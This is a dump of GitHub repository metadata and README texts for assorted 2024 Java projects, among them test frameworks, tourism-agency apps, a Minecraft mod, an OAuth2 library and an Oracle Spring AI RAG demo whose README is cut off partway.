schacko-samples/spring-stack-kafka-2024-demo,main,,,,2024-04-02T13:41:11Z,2024-04-02T23:38:02Z,,0,1,0,11,1,2,13,1,0,,Java
Aishwaryavenkat10/TestNG-Project,main,"**TDD TestNG Project**

**SELENIUM-TestNG-JAVA-MAVEN**

This repository contains a sample project that demonstrate how to use a selenium-testNG-java, a TDD (Test Driven Development) with TestNG and JAVA.
This Project showcase automation script development and utiliize various reports such as default testng reports, Extent-spark reports and allure reports.
Additionally, it offers the ability to capture screenshots for tests and generate error shots for failed test cases.

**INSTALLATION & PREREQUISITIES**
1.JDK(1.8+)

2.Maven

3.IntelliJ IDEA

4.Required Plugins

  Maven
  
  TestNG

**WHAT ARE ALL IMPLEMENTED IN FRAMEWORK**

1. Page Object Design Pattern.
2. TestNG TDD feature for executing test cases
3. Utility functions to handle Driver methods.
4. Extent and Allure reports for test execution details.
5. Docker - to execute the tests in light weight containers

**GETTING STARTED**

To setup the framework you can either clone the repository or download the zip file and set it up in your local workspace.

Import the project using eclipse or Intellij

**RUNNING THE TESTS**

Go to your project directory from commandprompt and hit following commands:

mvn clean install

mvn clean install -Dbrowser=""chrome""(to use any other browser)

mvn clean install -Denv=""qa""(to use any other environment)

if you are familiar with docker you can user the docker-compose yml file to run the tests in selenium grid

Use this command

docker-compose up -d
",,,2024-04-29T14:48:38Z,2024-05-12T10:58:39Z,,0,1,2,8,0,9,13,1,0,,Java
xxinPro/AdbShellUtils,master,"app连接shizuku服务，执行shell命令
===============================

注意：

1. 使用前请确保已经安装了`Shizuku`并授予了`shell`权限
2. 并不能执行所有`shell`命令，如`cd`
3. 当执行的命令中，路径带有空格时，使用双引号包裹，如`ls ""/temp dir/""`


详细开发过程记录在：https://blog.xxin.xyz/2024/04/28/Shizuku%E5%BC%80%E5%8F%91/

参考：

Shizuku开源地址：https://github.com/RikkaApps/Shizuku

Shizuku开发指南：https://github.com/RikkaApps/Shizuku-API",Shizuku开发演示项目，通过Shizuku使app执行shell命令,,2024-04-28T11:05:35Z,2024-05-17T11:42:09Z,,0,1,0,4,3,1,13,1,0,,Java
aliosmanuysal/TourismAgency,master,"# TURİZM ACENTE SİSTEMİ PROJESİ

#### Java version 21 kullanılarak geliştirilmiştir.

### Proje Tanımı

- Bu proje, bir turizm acentesinin otel yönetimi, oda yönetimi ve rezervasyon işlemlerini gerçekleştirmek için geliştirilmiştir.
- Proje, Java, Swing, JDBC ve MySQL teknolojileri kullanılarak geliştirilmiştir.
- Proje, 2 tip kullanıcı (Admin ve Employee) ile çalışmaktadır.
- Proje, Admin kullanıcısı çalışanları yönetirken, Employee kullanıcısı otel yönetimi, oda yönetimi ve rezervasyon işlemlerini gerçekleştirir.
- Proje, Admin ve Employee kullanıcıları için ayrı ekranlar tasarlanmıştır.
- Proje, Admin ve Employee kullanıcıları için ayrı yetkilendirme işlemleri yapılmıştır.

### Proje Login ekranıyla başlar.

### LOGIN EKRANI

- Sistemde Admin ve Employee adında iki tip kullanıcı  tanımlanmıştır.

![Fotoğraf](/src/Images/GirişEkranı.png)


### ADMIN EKRANI

- Admin Ekranında çalışanları silme , ekleme ve filtreleme işlemleri yapılır.


![Fotoğraf](/src/Images/KullanıcıEkranı.png)

### Filtreleme işlemi

- Ad soyad , Kullanıcı Adı ve Üyelik Tipine göre Filtreleme Yapılabilir.

![Fotoğraf](/src/Images/Filtrelemeİslemi.png)

### Ekleme işlemi

- Ekleme işlemi yapıldıktan sonra tüm alanlar dolu ise  ""İşlem Başarılı"" mesajı verilir

![Fotoğraf](/src/Images/EklemeIslemi.png)

### Silme işlemi

- Silme işlemi yapıldıktan sonra ""İşlem Başarılı"" mesajı verilir

![Fotoğraf](/src/Images/SilmeIslemi.png)

### EMPLOYEE EKRANI

- Employee ekranında Otel yönetimi , Oda yönetimi ve rezervasyon ekranları bulunur.

![Fotoğraf](/src/Images/OtelYönetimi.png)

- Otel Yönetimi ekranında   sisteme yeni otel ekleme, otele özellik ekleme , otele oda ekleme
otel arama ve otel silme gibi işlemler yapılır .

### ODAYA ÖZELLİK EKLEME EKRANI

- Seçim yapmadan otele özellik eklenemez. Ekrana Hata mesajı verilir.
Bu ekranda pansiyon özellikleri , Tesis özellikleri ve Sezon ekleme işlemi yapılır.
Boş Alan bırakılırsa ""Lütfen tüm alanları doldurun"" mesajı verilir.
Ekleme işlemi yapıldıktan sonra tüm alanlar dolu ise  ""İşlem Başarılı"" mesajı verilir

![Fotoğraf](/src/Images/OdayaÖzellikEkleme.png)

### OTELE ODA EKLEME EKRANI

- Bu ekranda seçilen otele oda tipini,dönemi,pansiyon tipini stok ,ve ücretler belirlenerek oda eklenir.
Boş Alan bırakılırsa ""Lütfen tüm alanları doldurun"" mesajı verilir.
Ekleme işlemi yapıldıktan sonra tüm alanlar dolu ise  ""İşlem Başarılı"" mesajı verilir

![Fotoğraf](/src/Images/OdaEklemeEkranı.png)

### ODA YÖNETİMİ

- Oda Yönetimi ekranında Oda arama , Odaya Özellik ekleme , Oda silme ve Seçilen Odaya Rezervasyon yapma işlemleri yapılır.

![Fotoğraf](/src/Images/OdaYönetimi.png)

### REZERVASYON EKRANI

- Rezervasyon Ekranında sol bölümde seçilen odaya ait otel ve oda bilgileri yer alır. Sağ bölümde Müşteriye ait bilgiler yazılır.
Bu ekranda Rezerve edilen odanın Fiyat hesaplanması yapılır.Rezervasyon kaydedildikten sonra kullanıcıya İşlem Başarılı mesajı verilir.

![Fotoğraf](/src/Images/RezarvasyonEkrani.png)

### REZERVASYON LİSTESİ EKRANI

- Burada rezervasyonalar listelenir ve Rezervasyon silme işlemi yapılır.

![Fotoğraf](/src/Images/RezervasyonListesi.png)

#### Proje Geliştiricisi

- [Ali Osman UYSAL](https://www.linkedin.com/in/aliosmanuysal/)




",Patika+,"java,jdbc-driver,mysql-database,sql-server,swing-gui",2024-04-30T20:13:19Z,2024-04-30T20:14:00Z,,0,2,0,1,0,0,13,1,0,,Java
tiremoscode/curso-java-md-20,main,,,,2024-04-24T23:14:01Z,2024-06-12T23:25:43Z,,0,10,19,69,0,20,13,1,0,,Java
thebuildcraft/RemotePlayerWaypointsForXaero,main,"<img src=""common/src/main/resources/assets/remote_player_waypoints_for_xaero/icon.png"" alt=""icon"" style=""float: none; margin-right: 10px;"" width=""200"" height=""auto"" />

# Remote player waypoints for Xaero's Map

<a href=""https://modrinth.com/mod/remote-player-waypoints-for-xaeros-map""><img src=""https://img.shields.io/modrinth/dt/remote-player-waypoints-for-xaeros-map?logo=modrinth&label=&suffix=%20&style=flat&color=242629&labelColor=5ca424&logoColor=1c1c1c"" alt=""Modrinth""></a>
<a href=""https://github.com/thebuildcraft/RemotePlayerWaypointsForXaero/blob/main/LICENSE""><img src=""https://img.shields.io/github/license/thebuildcraft/RemotePlayerWaypointsForXaero?style=flat&color=900c3f"" alt=""License""></a>

---

This is a small client mod that allows you to see other players from further away on servers and see online-map-markers in game.
It does this by getting the position data from Dynmap, Bluemap, Squaremap or Pl3xMap running on the server and displaying it with waypoints and icons in [Xaero's Minimap](https://modrinth.com/mod/xaeros-minimap) and [Worldmap](https://modrinth.com/mod/xaeros-world-map).

The AFK display feature can be used without having a map mod installed.

### Features
- see player positions as waypoints and icons on Xaero's Minimap _(see more below)_ and Worldmap
- see online-map-markers in game
- AFK display in tab list
- friend-list features (for example overwrite color of waypoints of friends)
- configurable trough Modmenu and Cloth Config Api
- **==> [Roadmap](https://github.com/users/thebuildcraft/projects/1)**

### Supported Maps
- Dynmap
- Bluemap
- Squaremap
- Pl3xMap

### How to use
You just have to add the server you want to use this mod on to the list in the config:<br>
""server ip"" is the ip you use to connect to the minecraft server<br>
""online map link"" is the weblink to the map online  (just copy it from the browser)<br>
And make sure to set the ""map-type"" correctly!

### Compatibility
- Fabric, Quilt, Forge, NeoForge
- Xaero's Minimap and Xaero's Better PvP + Fair Play Versions
- Xaero's Worldmap

### Massive thanks to
- [ewpratten](https://github.com/ewpratten) for making [RemotePlayers](https://github.com/ewpratten/remoteplayers) which this mod was originally based on
- [MeerBiene](https://github.com/MeerBiene) for having the idea and helping with the AFK-time formatting
- [eatmyvenom](https://github.com/eatmyvenom) for having the idea and helping with implementing the marker support
- [James Seibel](https://gitlab.com/jeseibel) for making Distance Horizons: I used a lot of the multi-version build scripts from there.
- [TheMrEngMan](https://github.com/TheMrEngMan) for letting me use the features from his own fork of the original RemotePlayers mod

_This mod is not officially affiliated with Dynmap, Bluemap, Squaremap, Pl3xMap or Xaero in any way._
","Shows player and marker positions from Dynmap, Bluemap, Squaremap or Pl3xMap in game using Xaeros Minimap and Worldmap. Also displays AFK status in the tab list.","dynmap,minecraft,mod,xaeros-minimap,bluemap",2024-04-02T18:58:26Z,2024-09-04T15:56:24Z,2024-08-22T17:00:39Z,13,5,4,126,7,4,13,4,0,GPL-3.0,Java
Badbird5907/GHShareXUploader,master,"# Github asset ShareX uploader

POC Code! Don't actually use this, uploaded files will probably be purged anyway.

## Video:
[![Video](https://img.youtube.com/vi/LLaVhYZbmTU/0.jpg)](https://youtube.com/watch?v=LLaVhYZbmTU)",,,2024-04-21T22:28:27Z,2024-04-23T13:32:15Z,,0,1,0,4,0,1,13,1,0,,Java
atmacasoftware/turizmAcenteSistemi,main,"# Turizm Acente Uygulaması

## Kullanılan Teknolojiler
* Java (Version 21)
* PostgreSQL (Version 16)

## Yüklenecek Kütüphaneler
* postgresql-42.7.3.jar
* flatlaf-3.4.1.jar
* flatlaf-intellij-themes-3.4.1.jar

### Proje Bilgisi

#### Giriş Ekranı

Giriş ekranında giriş yapılabilmesi için `user` veritabanına kayıtlı `email` ve `password` ile giriş yapılabilmektedir. 
`email` ve `password` yazıldıktan sonra `business` katmanında yer alan `UserManager` sınıfında girilen kullanıcın rolü (ADMIN veya PERSONEL) sorgulanmaktadır.
Admin ise AdminView ekranına gitmekte eğer Personel ise PersonelView ekranına gitmektedir.
Aşağıda giriş ekranına ait ekran görüntüsü verilmiştir.

![1](https://github.com/atmacasoftware/turizmAcenteSistemi/assets/94282227/8c59d808-420d-47da-82b6-eaad2e45533c)
<br>

### Admin Ekranı
Admin ekranında yeni kullanıcı ekleme, kullanıcı düzenleme, kullanıcı silme ve kullanıcıları role durumuna göre filtreleme işlemi yapılabilmektedir. Aşağıdak admin ekranına ait ekran görüntüleri verilmiştir.

![2](https://github.com/atmacasoftware/turizmAcenteSistemi/assets/94282227/07410bce-2abb-41a8-984f-9ddb60a6a573)
<br>
![3](https://github.com/atmacasoftware/turizmAcenteSistemi/assets/94282227/79d88533-fcbc-483c-a6cd-d005320a5fec)
<br>
### Personel Ekranı
Personel ekranında Otel yönetimi, oda yönetimi, dönem yönetimi ve rezervasyon işlemleri yapılmaktadır. Aşağıda bu ekranlara ait ekran görüntüleri verilmiştir.

![4](https://github.com/atmacasoftware/turizmAcenteSistemi/assets/94282227/531a9d56-5f9d-4a94-a640-e79443528212)
<br>
![15](https://github.com/atmacasoftware/turizmAcenteSistemi/assets/94282227/65dde52a-b514-42e2-86af-72b3b69d44c3)
<br>
![14](https://github.com/atmacasoftware/turizmAcenteSistemi/assets/94282227/0f26bc88-c8d2-4fa8-b13f-dbf1c5230abb)
<br>
![13](https://github.com/atmacasoftware/turizmAcenteSistemi/assets/94282227/fb178550-6384-402b-a294-9ee66c98f371)
<br>
![12](https://github.com/atmacasoftware/turizmAcenteSistemi/assets/94282227/8bac965e-5c17-41ff-9b1b-1ebfdd503d34)
<br>
![11](https://github.com/atmacasoftware/turizmAcenteSistemi/assets/94282227/f30016b9-cb1e-411c-827a-495ff4e6544d)
<br>
![10](https://github.com/atmacasoftware/turizmAcenteSistemi/assets/94282227/df653bbe-5ac1-49ec-8e15-f0c320b82f7d)
<br>
![9](https://github.com/atmacasoftware/turizmAcenteSistemi/assets/94282227/f9056e0a-dbc9-44c5-9897-99a8cc22760d)
<br>
![8](https://github.com/atmacasoftware/turizmAcenteSistemi/assets/94282227/953ac1f5-65df-4859-9bf3-cac04399c225)
<br>
![7](https://github.com/atmacasoftware/turizmAcenteSistemi/assets/94282227/221b22e7-5a84-4e94-9d6f-699e3fd872a9)
<br>
![6](https://github.com/atmacasoftware/turizmAcenteSistemi/assets/94282227/1bef2db2-59ae-4c11-af77-0036d2e289b6)
<br>
![5](https://github.com/atmacasoftware/turizmAcenteSistemi/assets/94282227/918cd891-c990-46dd-9bbf-32e6e3c79774)
<br>

### Tanıtım Videosu
https://drive.google.com/file/d/19FjbARjMRHoed1-OYzbLyZOxp9SgjV2a/view?usp=drive_link
",,,2024-04-19T07:39:15Z,2024-04-19T08:28:34Z,,0,2,0,10,0,0,13,1,0,,Java
patternknife/spring-security-oauth2-password-jpa-implementation,main,"# Spring Security Oauth2 Password JPA Implementation

> App-Token based OAuth2 ROPC POC built to grow with Spring Boot and ORM

## Quick Start
```xml
<dependency>
    <groupId>io.github.patternknife.securityhelper.oauth2.api</groupId>
    <artifactId>spring-security-oauth2-password-jpa-implementation</artifactId>
    <version>3.1.2</version>
</dependency>
```
For v2, using the database tables from Spring Security 5 (only the database tables; follow the dependencies as above):
```xml
<dependency>
    <groupId>io.github.patternknife.securityhelper.oauth2.api</groupId>
    <artifactId>spring-security-oauth2-password-jpa-implementation</artifactId>
    <version>2.8.2</version>
</dependency>
```

## Overview

* Complete separation of the library (API) and the client for testing it

* Set up the same access & refresh token APIs on both ``/oauth2/token`` and on our controller layer such as ``/api/v1/traditional-oauth/token``, both of which function same and have `the same request & response payloads for success and errors`. (However, ``/oauth2/token`` is the standard that ""spring-authorization-server"" provides.)
  * As you are aware, the API ``/oauth2/token`` is what ""spring-authorization-server"" provides.
    * ``/api/v1/traditional-oauth/token`` is what this library implemented directly.
        * Success Payload
         ```json
          {
              ""access_token"" : ""Vd4x8D4lDg7VBFh..."",
              ""token_type"" : ""Bearer"",
              ""refresh_token"" : ""m3UgLrvPtXKdy7jiD..."",
              ""expires_in"" : 3469,
              ""scope"" : ""read write""
           }
        ```
      
        * Error Payload (Customizable) 
        ```json
          {
              ""timestamp"": 1719470948370,
              ""message"": ""Couldn't find the client ID : client_admin"", // Sensitive info such as being thrown from StackTraces
              ""details"": ""uri=/oauth2/token"",
              ""userMessage"": ""Authentication failed. Please check your credentials."",
              ""userValidationMessage"": null
          }
        ```

        * In the following error payload, the 'message' shouldn't be exposed to clients; instead, the 'userMessage' should be.
      
* Authentication management based on a combination of username, client ID, and App-Token
  * What is an App-Token? An App-Token is a new access token generated each time the same account logs in. If the token values are the same, the same access token is shared.

| App-Token Status       | Access Token Behavior      |
|------------------------|----------------------------|
| same for the same user | Access-Token is shared     |
| different for the same user              | Access-Token is NOT shared |

  * Set this in your ``application.properties``. 
    * App-Token Behavior Based on `io.github.patternknife.securityhelper.oauth2.no-app-token-same-access-token`

| `no-app-token-same-access-token` Value | App-Token Status                          | Access Token Sharing Behavior                                                                                     |
|------------------------------------------------------------|-------------------------------------------|-------------------------------------------------------------------------------------------------------------------|
| `true`                                                     | App-Token is `null` for the same user     | Same user with a `null` App-Token shares the same access token across multiple logins.                             |
| `false`                                                    | App-Token is `null` for the same user                       | Even if the App-Token is `null`, the same user will receive a new access token for each login.                     |
| `-`                                                        | App-Token is shared for the same user     | Access tokens will not be shared. A new access token is generated for each unique App-Token, even for the same user.|
| `-`                                                        | App-Token is NOT shared for the same user | Each unique App-Token generates a new access token for the same user.                                              |


* Separated UserDetails implementation for Admin and Customer roles as an example. (This can be extended as desired by implementing ``UserDetailsServiceFactory``)
* For versions greater than or equal to v3, including the latest version (Spring Security 6), provide MySQL DDL, which consists of ``oauth2_authorization`` and ``oauth2_registered_client``.
* For v2, provide MySQL DDL, which consists of ``oauth_access_token, oauth_refresh_token and oauth_client_details``, which are tables in Security 5. As I meant to migrate current security system to Security 6 back then, I hadn't changed them to the ``oauth2_authorization`` table indicated in https://github.com/spring-projects/spring-authorization-server.

* Application of Spring Rest Docs
 
## Dependencies

| Category          | Dependencies                                                      |
|-------------------|-------------------------------------------------------------------|
| Backend-Language  | Java 17                                                           |
| Backend-Framework | Spring Boot 3.3.2 (the latest version)                            |
| Main Libraries    | Spring Security 6.3.1, Spring Security Authorization Server 1.3.1 |
| Package-Manager   | Maven 3.6.3 (mvnw, Dockerfile)                                    |
| RDBMS             | Mysql 8.0.17                                                      |

## Run the App

#### Import the SQL file in the ``mysql`` folder.

#### Install Maven
```shell
mvnw clean install
cd client
mvnw clean install # Integration tests are done here, which creates docs by Spring-Rest-Doc.
```
- Run the client module by running ``SpringSecurityOauth2PasswordJpaImplApplication`` in the client.
- The API information is found on ``http://localhost:8370/docs/api-app.html``, managed by Spring Rest Doc

![img.png](reference/docs/img1.png)

- In case you use IntelliJ, I recommend creating an empty project and importing the API (root) module and client module separately.
- The client module definitely consumes the API module, but not vice versa.

## API Guide

### **Registration**
  - See the `client` folder. As the Api module consumes JPA, adding it to Beans is required.

```java

// ADD 'io.github.patternknife.securityhelper.oauth2.api'
@SpringBootApplication(scanBasePackages =  {""com.patternknife.securityhelper.oauth2.client"", ""io.github.patternknife.securityhelper.oauth2.api""})
public class SpringSecurityOauth2PasswordJpaImplApplication {

    public static void main(String[] args) {
        SpringApplication.run(SpringSecurityOauth2PasswordJpaImplApplication.class, args);
    }

}
```

```java
@Configuration
// ADD 'io.github.patternknife.securityhelper.oauth2.api.config.security'
@EnableJpaRepositories(
        basePackages = {""com.patternknife.securityhelper.oauth2.client.domain"",
                ""com.patternknife.securityhelper.oauth2.client.config.securityimpl"",
                ""io.github.patternknife.securityhelper.oauth2.api.config.security""},
        entityManagerFactoryRef = ""commonEntityManagerFactory"",
        transactionManagerRef= ""commonTransactionManager""
)
public class CommonDataSourceConfiguration {
    

   // ADD 'io.github.patternknife.securityhelper.oauth2.api.config.security'
    @Primary
    @Bean(name = ""commonEntityManagerFactory"")
    public LocalContainerEntityManagerFactoryBean commonEntityManagerFactory(EntityManagerFactoryBuilder builder) {
        return builder
                .dataSource(commonDataSource())
                .packages(""com.patternknife.securityhelper.oauth2.client.domain"",
                        ""io.github.patternknife.securityhelper.oauth2.api.config.security"")
                .persistenceUnit(""commonEntityManager"")
                .build();
    }

}
```

### **Implementation of...**

#### ""Mandatory"" settings

  - The only mandatory setting is ``client.config.securityimpl.service.userdetail.CustomUserDetailsServiceFactory``. The rest depend on your specific situation.

#### ""Customizable"" settings

  - **Insert your code when events happen such as tokens created**
    - ``SecurityPointCut``
    - See the source code in ``client.config.securityimpl.aop``
    

  - **Register error user messages as desired**
    - ``ISecurityUserExceptionMessageService``
    - See the source code in ``client.config.securityimpl.message``
    

  - **Customize the whole error payload as desired for all cases**
    - What is ""all cases""?
      - Authorization Server (""/oauth2/token"", ""/api/v1/traditional-oauth/token"") and Resource Server (Bearer token inspection : 401, Permission : 403)
    - Customize errors of the following cases
      - Login (/oauth2/token) : ``client.config.securityimpl.response.CustomAuthenticationFailureHandlerImpl``
      - Login (/api/v1/traditional-oauth/token) : ``client.config.response.error.GlobalExceptionHandler.authenticationException`` (""/api/v1/traditional-oauth/token"", Resource Server (Bearer token inspection))
      - Resource Server (Bearer token expired or with a wrong value, 401) :``client.config.securityimpl.response.CustomAuthenticationEntryPointImpl`` 
      - Resource Server (Permission, 403, @PreAuthorized on your APIs) ``client.config.response.error.GlobalExceptionHandler.authorizationException``
      

  - **Customize the whole success payload as desired for the only ""/oauth2/token""**
      - ``client.config.securityimpl.response.CustomAuthenticationSuccessHandlerImpl``
      - The success response payload of ""/api/v1/traditional-oauth/token"" is in ``api.domain.traditionaloauth.dto`` and is not yet customizable.

 - **Customize the verification logic for UsernamePassword and Client as desired**
    - ``IOauth2AuthenticationHashCheckService``

## Running this App with Docker
* Use the following module for Blue-Green deployment:
  * https://github.com/patternknife/docker-blue-green-runner
* The above module references this app's Dockerfile and the entrypoint script in the .docker folder.

## Contribution Guide
* You can create a pull request directly to the main branch.
* Integration tests in the client folder are sufficient for now, but you may add more if necessary.
* There is a lack of unit tests, so contributions to unit test code are welcome, which will help improve the overall codebase.",App-Token based fully extended and extensible implementation of Spring Security 6 Spring Authorization Server for stateful OAuth2 Password Grant (ROPC),"oauth2,oauth2-password-flow,spring-authorization,spring-security,jpa,spring-authorization-server",2024-04-07T15:02:40Z,2024-09-16T01:39:34Z,2024-09-14T14:53:30Z,14,1,0,49,0,4,13,3,0,,Java
Anirudh1103/Complete-Java-and-DSA,main,"This Repository contains java code from Beginner level to experienced 
This repo also contains Data Structures code and explaination
I will upload a new DSA repository, it will have DSA interview problems and all DSA explainantion
DSA Concepts covered:
* Basics of Java
* Conditionals & Loops
* Functions & Methods
* Arrays
  - Searching (Linear search)
  - Binary Search
  - Binary Search on 2D Arrays
  - Sorting Algorithms
* Stack
* Queue
   - Circular Queue
   - Priority Queue
* Linked Lists
  - Singly Linked List
  - Doubly Linked list
  - Circular Singly Linked list
  - Circular Doubly Linked list
* Hash tables
* Trees
  -Binary trees
* Heaps
* Graphs

Enjoy learning.......
",This repo contains complete Java practice code and complete DSA code,,2024-04-20T06:26:25Z,2024-09-04T09:49:05Z,,0,1,0,21,0,0,13,1,0,,Java
oracle-devrel/springai-rag-db23ai,main,"# Spring AI for RAG on Oracle 23ai Vector DB with OpenAI and private LLMs

![cover](./img/cover.png)

## Introduction

In this demo, we'll guide you through the process of leveraging Java, Spring Boot, Oracle DB23ai and the innovative Spring AI APIs to create next-generation applications.

- Build a Spring Boot Application with RAG (Retrieval Augmented Generation): Discover how to leverage Spring AI to implement a knowledge management system that retrieves relevant information and utilizes large language models to generate insightful responses.
- Integrate Domain Knowledge from Oracle 23ai: Learn how to connect your Spring Boot application with Oracle's 23ai to access and utilize domain-specific knowledge for more accurate and relevant responses.
- Transition to Production with Oracle Backend Platform: We'll address the challenges of moving your knowledge management system from development to production using the Oracle Backend Platform for Spring Boot and Microservices.

Check out [demo here](https://www.youtube.com/watch?v=H2w6oULzFCo&list=PLPIzp-E1msraY9To-BB-vVzPsK08s4tQD&index=26)

The demo shows a Retrieval-Augmented Generation using the following modules:

* Spring AI API
* Oracle DB 23ai
* OpenAI Embeddings
* OpenAI Chat
* OLLAMA local LLM embeddings model
* OLLAMA local LLM LLama2 model for chat

This demo is based on a early draft example of **Spring AI API**'s implementation for the **Oracle 23ai** as vector store, according to the specifications reported here: **[Vector DBs](https://docs.spring.io/spring-ai/reference/api/vectordbs.html)**.

There are two different types of files that contribute to the Retrieval-Augmented Generation (RAG) system in this solution:

- **PDF** file is split in chunks and stored as text with vector embeddings.
- **JSON** docs are created exploiting the **JSON-Duality** capability on existing tables

The interface, that uses Oracle Database 23ai as a Vector Store in a Spring AI pipeline, is the following:

```
public interface VectorStore {

        void add(List<Document> documents);

        Optional<Boolean> delete(List<String> idList);

        List<Document> similaritySearch(SearchRequest request);

        List<Document> similaritySearch(String query);
}
```

These operations allow uploading documents into a vector database, searching for similar documents using the specific vector distance algorithm chosen (you can change this in the `.properties` files). 

```
default List<Document> similaritySearch(String query) {
    return this.similaritySearch(SearchRequest.query(query));
}
```

The file `src/main/java/com/example/demoai/OracleDBVectorStore.java` holds this implementation.

The Vector Store saves the data in this **VECTORTABLE**:

```
CREATE TABLE VECTORTAB (
        id NUMBER GENERATED AS IDENTITY,
        text CLOB,
        embeddings VECTOR,
        metadata JSON,
        PRIMARY KEY (id)
);
```

The **id** will be based on an generated **Identity** Column key, but this can be changed if you prefer.

The metadata content depends on what's coming from Document object, and in this case it will hold the following data:

```
{
    ""page_number"":""xxx"",
    ""file_name"":""xxx"", 
}
```

This table is created at each application startup by default but, by configuring the `config.dropDb` parameter to `false` in  `application-dev.properties`, you can accumulate data every time you start up the application startup, in the same vector tab, and these documents will increase the vector database's knowledge base.

## Docs

With regards to endpoint services, you can find the implementation in [DemoaiController.java](src/main/java/com/example/demoai/controller/DemoaiController.java). The following main REST services have been implemented:

- **/store**

    Accepts a PDF doc to be chunked, vector embeddings are created and stored in the **VECTORTABLE**.

- **/store-json**

    Providing the name of a **relational duality view** created on the DB, this service creates, for each JSON record, a vector embedding, chunks it, and stores it in the **VECTORTABLE**. This service shows that you can put both structured and unstructured text data into the RAG, and you'll be able to query this data in natural language as querying a JSON document.

- **/rag**
    Providing a query in natural language, it manages in a Retrieval-Augmented Generation pipeline that uses the content of **VECTORTABLE**, adding the most similar chunks to the question to the context and sending everything using a template in the file: [prompt-template.txt](src/main/resources/prompt-template.txt)

The following tests have also been implemented, to debug and play with the solution if you're really interested:

- **/search-similar**

    Returns a list of the nearest chunks to the message provided stored in the **VECTORTABLE**. This means, you can check the ""closest matches"" in your vector database. It's useful to get info about the context used to determine the prompt sent to the LLM for the completion process and use as references to provide a response.

- **/delete**

    Allows you to remove a list of chunks, identified by their IDs, from **VECTORTABLE**.

- **/embedding**

    Provide, given an input string, its corresponding generated vector embedding.

- **/generate**

    Chat client that doesn't use the RAG pipeline. It could be used as a baseline to show the differences between a response provided by the LLM service as-is (OpenAI, OLLAMA) and an augmented request. It's useful to check if any public content has been used for LLM training, whether the response is near to what you expect, without providing your documents.

## 0. Prerequisites

### JDBC driver for Oracle DB 23ai



This demo works with the latest `ojdbc11.jar` driver related to the Oracle DBMS (23.4). To run this project, download this driver from Oracle site or directly from your DB server, looking in the directory: `$ORACLE_HOME/jdbc/lib/ojdbc11.jar`. After downloading in your local home dir, import it as a local Maven artifact with this command:

```
mvn install:install-file -Dfile=<HOME_DIR>/ojdbc11.jar -DgroupId=com.oracle.database.jdbc -DartifactId=ojdbc11 -Dversion=23.4.0.0 -Dpackaging=jar -DgeneratePom=true
```
or including in the `pom.xml` the following dependency:

```xml
<dependency>
	<groupId>com.oracle.database.jdbc</groupId>
	<artifactId>ojdbc11</artifactId>
	<version>23.4.0.24.05</version>
</dependency>
```

### Environment variables

Set the correct environment variables in a `env.sh` (or put these directly into `/home/$USER/.bashrc`) file with this content, according your server IPs (if you're planning on deploying with oLLaMA):

```
export OPENAI_URL=https://api.openai.com
export OPENAI_MODEL=gpt-3.5-turbo
export OPENAI_EMBEDDING_MODEL=text-embedding-ada-002
export VECTORDB=[VECTORDB_IP]
export DB_USER=vector
export DB_PASSWORD=vector
export OLLAMA_URL=http://[GPU_SERVER_IP]:11434
export OLLAMA_EMBEDDINGS=NousResearch--llama-2-7b-chat-hf
export OLLAMA_MODEL=llama2:7b-chat-fp16
export OPENAI_API_KEY=[YOUR_OPENAI_KEY]
#export OPENAI_URL=http://[GPU_SERVER_IP]:3000
#export OPENAI_MODEL=NousResearch--llama-2-7b-chat-hf
```

To invoke both OpenAI `gpt-3.5-turbo` and `text-embedding-ada-002`, you'll also need your `YOUR_OPENAI_KEY`, which must be obtained directly from the [Open AI developer platform](https://platform.openai.com/).

About the OLLAMA_EMBEDDINGS/MODEL used, you are free for your experiment to go on the [OLLAMA Library](https://ollama.com/library) and choose other models.

As you can see, you can configure also the `OPENAI_URL`, which helps to invoke OpenAI LLMs providers compatible with the OpenAI APIs. This way, you can switch easly to other providers, even private ones.

Set env with command in a shell:

```
source ./env.sh
```

## 1. Setup

### Oracle Database 23ai setup

1. Download and install from [Oracle Database Free Get Started](https://www.oracle.com/database/free/get-started/) site an **Oracle Database 23ai Free**, for example, as a docker container in this way:

```
docker run -d -p 1521:1521 --name db23ai container-registry.oracle.com/database/free:latest
docker exec db23ai ./setPassword.sh manager
```

2. After startup, download and install an Oracle Instant Client from the same [site](https://www.oracle.com/database/free/get-started/), and connect to the instance as shown here:

```
sqlplus sys/manager@""${VECTORDB}:1521/FREEPDB1"" as sysdba
```

3. If running locally:

```
sqlplus sys/manager@""localhost:1521/FREEPDB1"" as sysdba
```

to create a **vector** user to run the example:

```
create user vector identified by ""vector"";
grant connect to vector;
grant resource to vector;
alter user vector default role connect, resource;
alter user vector quota unlimited on users;
```

Once we've created the user, we'll be able to use it in our Spring AI application by modifying `application-dev.properties`.

If running locally:

```
sqlplus vector/vector@""localhost:1521/FREEPDB1"" as sysdba
```

We can check the content by connecting to the Oracle DB:

```
sqlplus vector/vector@""${VECTORDB}:1521/FREEPDB1""
```

### Application

In the `application-dev.properties` files will be used the environment variables set at the step before:

```
spring.ai.openai.api-key=${OPENAI_API_KEY}
spring.ai.openai.base-url=${OPENAI_URL}
spring.ai.openai.chat.options.model=${OPENAI_MODEL}
spring.ai.openai.embedding.options.model=${OPENAI_EMBEDDING_MODEL}
spring.ai.openai.chat.options.temperature=0.3
spring.datasource.url=jdbc:oracle:thin:@${VECTORDB}:1521/ORCLPDB1
spring.datasource.username=${DB_USER}
spring.datasource.password=${DB_PASSWORD}
spring.datasource.driver-class-name=oracle.jdbc.OracleDriver
config.tempDir=tempDir
config.dropDb=true
config.vectorDB=vectortable
config.distance=EUCLIDEAN
spring.servlet.multipart.max-file-size=10MB
spring.servlet.multipart.max-request-size=20MB
spring.ai.ollama.base-url=${OLLAMA_URL}
spring.ai.ollama.embedding.options.model=${OLLAMA_EMBEDDINGS}
spring.ai.ollama.chat.options.model=${OLLAMA_MODEL}
```

In `application.properties`, check if the default env is set as `dev`:

```
spring.profiles.active=dev
```

Then build and run the application:

- Set env: `source ./env.sh`
- Build: `mvn clean package -Dmaven.test.skip=true`
- Run: `mvn spring-boot:run`

For each source update, repeat these two steps.

## 1. Test OpenAI version

Check code:

pom.xml:

```
<!--//CHANGE-->
<!-- Ollama for embeddings/chat
    <dependency>
        <groupId>org.springframework.ai</groupId>
        <artifactId>spring-ai-ollama-spring-boot-starter</artifactId>
    </dependency>
-->
```

DemoaiController.java:

```
    //CHANGE
    //import org.springframework.ai.ollama.OllamaEmbeddingClient;
    //import org.springframework.ai.ollama.OllamaChatClient;
    ...

    //CHANGE
    private final EmbeddingClient embeddingClient;
    //private final OllamaEmbeddingClient embeddingClient;

    //CHANGE
        private final ChatClient chatClient;
